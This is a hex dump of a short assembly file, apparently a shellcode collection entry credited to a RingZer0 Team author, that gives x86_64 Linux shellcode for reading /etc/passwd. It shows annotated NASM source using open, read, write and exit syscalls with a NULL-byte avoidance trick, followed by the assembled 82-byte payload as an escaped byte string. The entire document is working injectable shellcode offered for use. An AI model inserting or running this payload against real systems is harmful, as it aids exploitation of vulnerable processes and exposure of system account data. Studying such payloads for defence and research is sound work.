00000000  42 49 54 53 20 36 34 0a  3b 20 41 75 74 68 6f 72  |BITS 64.; Author|
00000010  20 4d 72 2e 55 6e 31 6b  30 64 33 72 20 2d 20 52  | Mr.Un1k0d3r - R|
00000020  69 6e 67 5a 65 72 30 20  54 65 61 6d 0a 3b 20 52  |ingZer0 Team.; R|
00000030  65 61 64 20 2f 65 74 63  2f 70 61 73 73 77 64 20  |ead /etc/passwd |
00000040  4c 69 6e 75 78 20 78 38  36 5f 36 34 20 53 68 65  |Linux x86_64 She|
00000050  6c 6c 63 6f 64 65 0a 3b  20 53 68 65 6c 6c 63 6f  |llcode.; Shellco|
00000060  64 65 20 73 69 7a 65 20  38 32 20 62 79 74 65 73  |de size 82 bytes|
00000070  0a 67 6c 6f 62 61 6c 20  5f 73 74 61 72 74 0a 0a  |.global _start..|
00000080  73 65 63 74 69 6f 6e 20  2e 74 65 78 74 0a 0a 5f  |section .text.._|
00000090  73 74 61 72 74 3a 0a 6a  6d 70 20 5f 70 75 73 68  |start:.jmp _push|
000000a0  5f 66 69 6c 65 6e 61 6d  65 0a 20 20 0a 5f 72 65  |_filename.  ._re|
000000b0  61 64 66 69 6c 65 3a 0a  3b 20 73 79 73 63 61 6c  |adfile:.; syscal|
000000c0  6c 20 6f 70 65 6e 20 66  69 6c 65 0a 70 6f 70 20  |l open file.pop |
000000d0  72 64 69 20 3b 20 70 6f  70 20 70 61 74 68 20 76  |rdi ; pop path v|
000000e0  61 6c 75 65 0a 3b 20 4e  55 4c 4c 20 62 79 74 65  |alue.; NULL byte|
000000f0  20 66 69 78 0a 78 6f 72  20 62 79 74 65 20 5b 72  | fix.xor byte [r|
00000100  64 69 20 2b 20 31 31 5d  2c 20 30 78 34 31 0a 20  |di + 11], 0x41. |
00000110  20 0a 78 6f 72 20 72 61  78 2c 20 72 61 78 0a 61  | .xor rax, rax.a|
00000120  64 64 20 61 6c 2c 20 32  0a 78 6f 72 20 72 73 69  |dd al, 2.xor rsi|
00000130  2c 20 72 73 69 20 3b 20  73 65 74 20 4f 5f 52 44  |, rsi ; set O_RD|
00000140  4f 4e 4c 59 20 66 6c 61  67 0a 73 79 73 63 61 6c  |ONLY flag.syscal|
00000150  6c 0a 20 20 0a 3b 20 73  79 73 63 61 6c 6c 20 72  |l.  .; syscall r|
00000160  65 61 64 20 66 69 6c 65  0a 73 75 62 20 73 70 2c  |ead file.sub sp,|
00000170  20 30 78 66 66 66 0a 6c  65 61 20 72 73 69 2c 20  | 0xfff.lea rsi, |
00000180  5b 72 73 70 5d 0a 6d 6f  76 20 72 64 69 2c 20 72  |[rsp].mov rdi, r|
00000190  61 78 0a 78 6f 72 20 72  64 78 2c 20 72 64 78 0a  |ax.xor rdx, rdx.|
000001a0  6d 6f 76 20 64 78 2c 20  30 78 66 66 66 3b 20 73  |mov dx, 0xfff; s|
000001b0  69 7a 65 20 74 6f 20 72  65 61 64 0a 78 6f 72 20  |ize to read.xor |
000001c0  72 61 78 2c 20 72 61 78  0a 73 79 73 63 61 6c 6c  |rax, rax.syscall|
000001d0  0a 20 20 0a 3b 20 73 79  73 63 61 6c 6c 20 77 72  |.  .; syscall wr|
000001e0  69 74 65 20 74 6f 20 73  74 64 6f 75 74 0a 78 6f  |ite to stdout.xo|
000001f0  72 20 72 64 69 2c 20 72  64 69 0a 61 64 64 20 64  |r rdi, rdi.add d|
00000200  69 6c 2c 20 31 20 3b 20  73 65 74 20 73 74 64 6f  |il, 1 ; set stdo|
00000210  75 74 20 66 64 20 3d 20  31 0a 6d 6f 76 20 72 64  |ut fd = 1.mov rd|
00000220  78 2c 20 72 61 78 0a 78  6f 72 20 72 61 78 2c 20  |x, rax.xor rax, |
00000230  72 61 78 0a 61 64 64 20  61 6c 2c 20 31 0a 73 79  |rax.add al, 1.sy|
00000240  73 63 61 6c 6c 0a 20 20  0a 3b 20 73 79 73 63 61  |scall.  .; sysca|
00000250  6c 6c 20 65 78 69 74 0a  78 6f 72 20 72 61 78 2c  |ll exit.xor rax,|
00000260  20 72 61 78 0a 61 64 64  20 61 6c 2c 20 36 30 0a  | rax.add al, 60.|
00000270  73 79 73 63 61 6c 6c 0a  20 20 0a 5f 70 75 73 68  |syscall.  ._push|
00000280  5f 66 69 6c 65 6e 61 6d  65 3a 0a 63 61 6c 6c 20  |_filename:.call |
00000290  5f 72 65 61 64 66 69 6c  65 0a 70 61 74 68 3a 20  |_readfile.path: |
000002a0  64 62 20 22 2f 65 74 63  2f 70 61 73 73 77 64 41  |db "/etc/passwdA|
000002b0  22 0a 20 20 0a 53 68 65  6c 6c 63 6f 64 65 3a 0a  |".  .Shellcode:.|
000002c0  0a 5c 78 65 62 5c 78 33  66 5c 78 35 66 5c 78 38  |.\xeb\x3f\x5f\x8|
000002d0  30 5c 78 37 37 5c 78 30  62 5c 78 34 31 5c 78 34  |0\x77\x0b\x41\x4|
000002e0  38 5c 78 33 31 5c 78 63  30 5c 78 30 34 5c 78 30  |8\x31\xc0\x04\x0|
000002f0  32 5c 78 34 38 5c 78 33  31 5c 78 66 36 5c 78 30  |2\x48\x31\xf6\x0|
00000300  66 5c 78 30 35 5c 78 36  36 5c 78 38 31 5c 78 65  |f\x05\x66\x81\xe|
00000310  63 5c 78 66 66 5c 78 30  66 5c 78 34 38 5c 78 38  |c\xff\x0f\x48\x8|
00000320  64 5c 78 33 34 5c 78 32  34 5c 78 34 38 5c 78 38  |d\x34\x24\x48\x8|
00000330  39 5c 78 63 37 5c 78 34  38 5c 78 33 31 5c 78 64  |9\xc7\x48\x31\xd|
00000340  32 5c 78 36 36 5c 78 62  61 5c 78 66 66 5c 78 30  |2\x66\xba\xff\x0|
00000350  66 5c 78 34 38 5c 78 33  31 5c 78 63 30 5c 78 30  |f\x48\x31\xc0\x0|
00000360  66 5c 78 30 35 5c 78 34  38 5c 78 33 31 5c 78 66  |f\x05\x48\x31\xf|
00000370  66 5c 78 34 30 5c 78 38  30 5c 78 63 37 5c 78 30  |f\x40\x80\xc7\x0|
00000380  31 5c 78 34 38 5c 78 38  39 5c 78 63 32 5c 78 34  |1\x48\x89\xc2\x4|
00000390  38 5c 78 33 31 5c 78 63  30 5c 78 30 34 5c 78 30  |8\x31\xc0\x04\x0|
000003a0  31 5c 78 30 66 5c 78 30  35 5c 78 34 38 5c 78 33  |1\x0f\x05\x48\x3|
000003b0  31 5c 78 63 30 5c 78 30  34 5c 78 33 63 5c 78 30  |1\xc0\x04\x3c\x0|
000003c0  66 5c 78 30 35 5c 78 65  38 5c 78 62 63 5c 78 66  |f\x05\xe8\xbc\xf|
000003d0  66 5c 78 66 66 5c 78 66  66 5c 78 32 66 5c 78 36  |f\xff\xff\x2f\x6|
000003e0  35 5c 78 37 34 5c 78 36  33 5c 78 32 66 5c 78 37  |5\x74\x63\x2f\x7|
000003f0  30 5c 78 36 31 5c 78 37  33 5c 78 37 33 5c 78 37  |0\x61\x73\x73\x7|
00000400  37 5c 78 36 34 5c 78 34  31                       |7\x64\x41|
00000409
